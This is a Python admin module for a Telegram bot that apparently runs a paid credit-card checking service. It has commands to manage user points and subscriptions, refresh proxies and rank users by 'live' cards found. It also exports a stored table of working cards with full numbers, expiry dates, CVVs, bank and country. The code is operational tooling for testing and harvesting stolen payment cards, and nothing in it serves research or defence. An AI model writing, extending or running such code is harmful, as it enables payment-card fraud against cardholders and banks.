# admin.py
import os
import json
from datetime import datetime
from telebot.async_telebot import AsyncTeleBot
from config import ADMIN_ID
from database import db
from proxy_manager import proxy_manager
from formatter import format_admin_menu

def is_admin(user_id):
    return user_id == ADMIN_ID

async def handle_admin_commands(bot: AsyncTeleBot, message):
    """معالجة أوامر الادمن"""
    user_id = message.from_user.id
    if not is_admin(user_id):
        return
    
    text = message.text.split()
    cmd = text[0].lower()

    # قفل البوت
    if cmd == '/lock':
        import config
        config.BOT_LOCKED = True
        await bot.reply_to(message, "🔒 البوت مقفل. لن يستطيع أحد استخدامه.")
    
    # فتح البوت
    elif cmd == '/unlock':
        import config
        config.BOT_LOCKED = False
        await bot.reply_to(message, "🔓 البوت مفتوح. يمكن للجميع استخدامه.")
    
    # إضافة نقاط
    elif cmd == '/addpoints' and len(text) >= 3:
        try:
            target_id = int(text[1])
            points = float(text[2])
            db.update_points(target_id, points)
            await bot.reply_to(message, f"✅ تم إضافة {points} نقطة للمستخدم {target_id}")
        except:
            await bot.reply_to(message, "❌ /addpoints [id] [points]")
    
    # إضافة اشتراك
    elif cmd == '/addsub' and len(text) >= 3:
        try:
            target_id = int(text[1])
            days = int(text[2])
            db.set_subscription(target_id, days)
            await bot.reply_to(message, f"✅ تم إضافة {days} يوم اشتراك للمستخدم {target_id}")
        except:
            await bot.reply_to(message, "❌ /addsub [id] [days]")
    
    # إحصائيات المستخدمين
    elif cmd == '/users':
        users = db.cursor.execute("SELECT user_id, username, points, live_found FROM users ORDER BY live_found DESC LIMIT 20").fetchall()
        result = "📊 **أكثر المستخدمين نشاطاً:**\n\n"
        for i, (uid, username, points, live) in enumerate(users, 1):
            result += f"{i}. @{username or uid} | 💎 {points} | 🟢 {live}\n"
        await bot.reply_to(message, result, parse_mode='Markdown')
    
    # ملفات مستخدم
    elif cmd == '/files' and len(text) >= 2:
        try:
            target_id = int(text[1])
            files = db.get_user_files(target_id, 10)
            if not files:
                await bot.reply_to(message, f"لا يوجد ملفات للمستخدم {target_id}")
                return
            result = f"📁 **ملفات المستخدم {target_id}:**\n\n"
            for f in files:
                date = datetime.fromtimestamp(f[6]).strftime('%Y-%m-%d %H:%M')
                result += f"📄 {f[2]} | {f[4]} بطاقة | 🟢 {f[5]} LIVE | {date}\n"
            await bot.reply_to(message, result, parse_mode='Markdown')
        except:
            await bot.reply_to(message, "❌ /files [id]")
    
    # تحديث البروكسيات
    elif cmd == '/update_proxies':
        await bot.reply_to(message, "🔄 جاري تحديث البروكسيات...")
        proxies = await proxy_manager.update_proxies()
        await bot.reply_to(message, f"✅ تم تحديث البروكسيات. {len(proxies)} بروكسي حي.")
    
    # تصدير البطاقات الحية
    elif cmd == '/export_live':
        live_cards = db.cursor.execute("SELECT * FROM live_cards ORDER BY found_date DESC").fetchall()
        
        if not live_cards:
            await bot.reply_to(message, "📭 لا يوجد بطاقات حية محفوظة حتى الآن")
            return
        
        # إنشاء ملف النتائج
        filename = f"live_cards_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        filepath = os.path.join("results", filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write("LIVE CARDS EXPORT\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total: {len(live_cards)} cards\n")
            f.write("=" * 60 + "\n\n")
            
            for i, card in enumerate(live_cards, 1):
                # card: id, user_id, card_number, month, year, cvv, bank, card_type, country, full_details, found_date
                f.write(f"[{i}] {card[2]}|{card[3]}|{card[4]}|{card[5]}\n")
                f.write(f"    🏦 Bank: {card[6]}\n")
                f.write(f"    🔖 Type: {card[7]}\n")
                f.write(f"    🌍 Country: {card[8]}\n")
                f.write(f"    📅 Found: {datetime.fromtimestamp(card[10]).strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("-" * 40 + "\n")
        
        # إرسال الملف
        with open(filepath, 'rb') as f:
            await bot.send_document(
                message.chat.id, 
                f,
                caption=f"📊 **LIVE CARDS EXPORT**\n✅ Total: {len(live_cards)} cards\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode='Markdown'
            )
        
        # حذف الملف المؤقت
        os.remove(filepath)
        await bot.reply_to(message, f"✅ تم تصدير {len(live_cards)} بطاقة حية")
    
    # قائمة الادمن
    elif cmd == '/admin':
        await bot.reply_to(message, format_admin_menu(), parse_mode='Markdown')
